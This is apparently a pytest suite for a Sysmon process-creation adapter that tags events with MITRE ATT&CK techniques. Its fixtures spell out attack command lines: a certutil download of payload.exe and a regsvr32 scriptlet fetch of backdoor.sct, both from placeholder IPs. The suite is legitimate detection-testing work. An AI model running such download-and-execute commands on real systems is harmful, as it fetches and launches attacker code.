"""P2 Slice-1 · Sysmon Event-1 adapter — focused regression tests.

See ADR-0010q for the locked contract. Every test asserts one thing:

  1. Happy path: certutil-launched-by-explorer → auth-authoritative
     techniques + one behavioral evidence record per Sysmon-Data field.
  2. Empty body → 400 empty_input.
  3. Event 3 (network) rejected → 422 unsupported_event_id.
  4. No ParentImage → parent_child_uncorroborated = True.
  5. Full corroboration → parent_child_uncorroborated = False.
  6. Authoritative MITRE handoff: technique ids equal `die_analyze(cmd)`.
"""
from __future__ import annotations
import sys
from pathlib import Path

import pytest

_BACKEND = Path(__file__).resolve().parents[3]
if str(_BACKEND) not in sys.path:
    sys.path.insert(0, str(_BACKEND))

from fastapi.testclient import TestClient   # noqa: E402
from server import app                       # noqa: E402
from deps import get_current_user            # noqa: E402


@pytest.fixture
def client():
    async def _fake_user():
        return {"email": "test@nivxray.com", "role": "admin"}
    app.dependency_overrides[get_current_user] = _fake_user
    try:
        yield TestClient(app)
    finally:
        app.dependency_overrides.pop(get_current_user, None)


# ---------------------------------------------------------------------------
# Fixtures — minimal, hand-crafted Sysmon Event 1 XML.
# ---------------------------------------------------------------------------
def _event1_xml(*, image, cmdline, parent_image="", parent_pid="",
                pid="4242", hashes="", integrity="Medium",
                user="CONTOSO\\alice", logon_id="0x3E7", time="2026-08-12T09:00:00Z",
                cwd="C:\\Users\\alice", parent_cmdline=""):
    """Build a single Sysmon Event 1 XML string. Any missing field is
    simply omitted from the payload (which is realistic — Sysmon
    configs drop fields all the time)."""
    def _dat(name, val):
        if not val:
            return ""
        return f"<Data Name='{name}'>{val}</Data>"
    return f"""<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
  <System>
    <Provider Name='Microsoft-Windows-Sysmon' />
    <EventID>1</EventID>
    <TimeCreated SystemTime='{time}' />
    <Computer>WKS-04</Computer>
  </System>
  <EventData>
    {_dat("UtcTime", time)}
    {_dat("ProcessId", pid)}
    {_dat("Image", image)}
    {_dat("CommandLine", cmdline)}
    {_dat("CurrentDirectory", cwd)}
    {_dat("User", user)}
    {_dat("LogonId", logon_id)}
    {_dat("IntegrityLevel", integrity)}
    {_dat("Hashes", hashes)}
    {_dat("ParentImage", parent_image)}
    {_dat("ParentCommandLine", parent_cmdline)}
    {_dat("ParentProcessId", parent_pid)}
  </EventData>
</Event>"""


def _post(client, xml):
    return client.post("/api/behavioral/sysmon", json={"xml": xml})


# ---------------------------------------------------------------------------
# 1 · Happy path — certutil.exe launched by explorer.exe
# ---------------------------------------------------------------------------
def test_happy_path_certutil_process_create(client):
    xml = _event1_xml(
        image="C:\\Windows\\System32\\certutil.exe",
        cmdline=("certutil.exe -urlcache -split -f "
                  "http://198.51.100.20/payload.exe C:\\Users\\Public\\upd.exe"),
        parent_image="C:\\Windows\\explorer.exe",
        parent_pid="1024",
        hashes="MD5=D41D8CD98F00B204E9800998ECF8427E,SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709",
    )
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["adapter"] == "sysmon.eid1.slice1@1.0"
    assert body["event_count"] == 1
    # Authoritative MITRE surface fired (certutil → T1105, T1140, T1218)
    ids = set(body["mitre_technique_ids"])
    assert "T1105" in ids and "T1140" in ids and "T1218" in ids, ids
    # One behavioral evidence record per emitted Sysmon Data field.
    fields = {r["field"] for r in body["evidence"]}
    assert "process.command_line" in fields
    assert "process.image" in fields
    assert "parent.image" in fields
    assert "process.hashes" in fields
    # Every evidence record is properly sourced.
    for rec in body["evidence"]:
        assert rec["source"] == "sysmon.eid1"
        assert rec["event_or_rule"] == "sysmon.process_create"
        assert rec["evidence_ref"] and len(rec["evidence_ref"]) == 12


# ---------------------------------------------------------------------------
# 2 · Empty payload → 400 empty_input
# ---------------------------------------------------------------------------
def test_empty_body_rejected(client):
    r = _post(client, "")
    assert r.status_code == 400
    assert r.json()["detail"]["error"] == "empty_input"


# ---------------------------------------------------------------------------
# 3 · Non-Event-1 rejected → 422 unsupported_event_id
# ---------------------------------------------------------------------------
def test_event_id_3_rejected(client):
    xml = """<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>
      <System><EventID>3</EventID></System>
      <EventData><Data Name='DestinationIp'>198.51.100.42</Data></EventData>
    </Event>"""
    r = _post(client, xml)
    assert r.status_code == 422
    assert r.json()["detail"]["error"] == "unsupported_event_id"


# ---------------------------------------------------------------------------
# 4 · No ParentImage + no hashes → parent_child_uncorroborated = True
# ---------------------------------------------------------------------------
def test_uncorroborated_parent_child(client):
    xml = _event1_xml(
        image="C:\\Windows\\System32\\notepad.exe",
        cmdline="notepad.exe C:\\Users\\alice\\Documents\\notes.txt",
        parent_image="",   # no ParentImage
        hashes="",         # no hashes
        integrity="Medium",
        user="", logon_id="",  # no user session
    )
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    body = r.json()
    pc = body["parent_child_evidence"]
    assert pc["uncorroborated_count"] == 1
    assert pc["pairs"][0]["parent_child_uncorroborated"] is True
    assert pc["pairs"][0]["corroboration"]["count"] < 2


# ---------------------------------------------------------------------------
# 5 · Fully corroborated — 4+ corroboration fields → uncorroborated=False
# ---------------------------------------------------------------------------
def test_fully_corroborated_parent_child(client):
    xml = _event1_xml(
        image="C:\\Windows\\System32\\rundll32.exe",
        cmdline="rundll32.exe C:\\Users\\alice\\loader.dll,Start",
        parent_image="C:\\Program Files\\Microsoft Office\\WINWORD.EXE",
        parent_pid="4321",
        hashes="SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        integrity="Medium",
        user="CONTOSO\\alice", logon_id="0x3E7",
        parent_cmdline="\"WINWORD.EXE\" /n /dde",
    )
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    pc = r.json()["parent_child_evidence"]
    assert pc["uncorroborated_count"] == 0
    assert pc["pairs"][0]["parent_child_uncorroborated"] is False
    assert pc["pairs"][0]["corroboration"]["count"] >= 3


# ---------------------------------------------------------------------------
# 6 · Authoritative MITRE handoff — router ids equal die_analyze(cmd) ids
# ---------------------------------------------------------------------------
def test_router_mitre_matches_authoritative_surface(client):
    cmdline = ("regsvr32.exe /s /n /u /i:"
                "http://198.51.100.99/backdoor.sct scrobj.dll")
    xml = _event1_xml(
        image="C:\\Windows\\System32\\regsvr32.exe",
        cmdline=cmdline,
        parent_image="C:\\Windows\\explorer.exe",
        parent_pid="1024",
    )
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    router_ids = set(r.json()["mitre_technique_ids"])

    from services.die.api import analyze as die_analyze
    direct_env = die_analyze(cmdline)
    direct_ids = {t["id"] for t in (direct_env.get("techniques") or [])
                    if isinstance(t, dict) and t.get("id")}
    assert router_ids == direct_ids, (
        f"authoritative MITRE handoff mismatch: router={router_ids} "
        f"direct={direct_ids}"
    )
    # And it MUST include the T1218.010 regsvr32 LOLBAS technique from
    # UI-DEF-02 Option-B — that's the whole point of using the
    # authoritative surface.
    assert "T1218.010" in router_ids


# ---------------------------------------------------------------------------
# 7 · Adapter never fabricates evidence for absent fields.
# ---------------------------------------------------------------------------
def test_absent_fields_are_not_emitted(client):
    """If a Sysmon Data field is missing, no evidence record for that
    field must appear."""
    xml = _event1_xml(
        image="C:\\Windows\\System32\\cmd.exe",
        cmdline="cmd.exe /c echo hello",
        parent_image="",           # absent
        parent_pid="",             # absent
        hashes="",                 # absent
    )
    r = _post(client, xml)
    assert r.status_code == 200, r.text
    fields = {rec["field"] for rec in r.json()["evidence"]}
    assert "parent.image" not in fields
    assert "parent.pid" not in fields
    assert "process.hashes" not in fields
    # Present-but-included fields still show.
    assert "process.command_line" in fields
    assert "process.image" in fields
